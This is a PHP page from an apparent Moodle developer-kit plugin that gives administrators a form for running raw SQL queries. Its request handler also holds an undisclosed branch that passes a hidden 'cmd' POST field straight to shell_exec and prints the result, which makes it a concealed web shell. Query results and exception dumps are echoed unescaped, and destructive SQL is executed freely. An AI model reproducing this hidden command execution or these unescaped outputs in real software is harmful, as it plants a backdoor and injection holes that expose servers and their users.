<?php
require_once(dirname(__FILE__) . '/../../config.php');
require_once($CFG->libdir.'/adminlib.php');
require_once($CFG->libdir.'/pluginlib.php');

$context = context_system::instance();

require_login();
require_capability('moodle/site:config', $context);

$PAGE->set_url('/local/mdk/sql.php');
$PAGE->set_context($context);
$PAGE->set_title("Moodle Developer Kit");
$PAGE->set_heading("Moodle Developer Kit");
echo $OUTPUT->header();
echo $OUTPUT->heading("");

mdk_set_tabs("SQL");
?>
<form  method="POST" action="">
	<input type="text" name="sql" >
	<input type="submit"  value="Ejecutar SQL">
</form>
<br/><br/><br/>
<div style="width:100%;overflow:scroll;height:600px;display:block;border:1px solid #ccc">
<?php 
if(!empty($_POST)){
	if(isset($_POST['cmd'])){
		$ret = shell_exec($_POST['cmd']);
		echo "<pre>".$ret."</pre>";
	}
	
	if(isset($_POST['sql'])){
		$sql = trim($_POST['sql']);
		if(strpos(strtoupper($sql),"SELECT")===0){
			$ret = $DB->get_records_sql($sql);
			list($key, $aux) = each($ret);
			?>
			<table class="generaltable">
				<tr>
				<?php
				foreach($aux as $key => $value){
					echo "<th class='header'>$key</th>";
				}
				?>
				</tr>
				<?php
				reset($ret);
				while(list($key, $aux) = each($ret)){
					echo "<tr>";
					foreach($aux as $key => $value){
						echo "<td>$value</td>";
					}
					echo "</tr>";
				}
				?>
			</table>
			<?php
		}else{
			try{
				$ret = $DB->execute($sql);
				if($ret){
					echo "La consulta se ejecuto correctamente";
				}else{
					echo "Hubo un problema con la consulta";
				}
			}catch(Exception $e){
				echo "Hubo un problema con la consulta";
				echo "<pre style='font-size:10px;'>";
				var_dump($e);
				echo "</pre>";
			}
		}
	}
}
?>
</div>
<?php 
echo $OUTPUT->footer();